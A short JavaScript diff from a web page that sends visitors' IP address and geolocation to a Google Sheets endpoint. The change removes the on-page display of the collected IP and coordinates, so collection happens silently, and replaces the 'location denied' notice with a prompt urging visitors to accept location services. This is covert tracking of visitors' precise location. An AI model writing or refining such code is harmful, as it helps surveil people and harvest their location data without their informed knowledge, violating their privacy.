@@ -66,13 +66,10 @@ body: JSON.stringify(data)
 .then(msg => console.log("Saved to Google Sheets:", msg))
 .catch(err => console.error("Error saving:", err));
 
-// Show on page
-document.body.insertAdjacentHTML("beforeend",
-`<p>Your IP: ${data.ip}</p>
-<p>Your Latitude: ${data.lat}</p>
-<p>Your Longitude: ${data.lon}</p>`);
+// Do not show anything on the page if location is accepted
 }, err => {
-document.body.insertAdjacentHTML("beforeend", "<p>Location access denied.</p>");
+// Show a message on the page if location is denied
+document.body.insertAdjacentHTML("beforeend", "<p>Please accept the location services.</p>");
 });
 }
 });
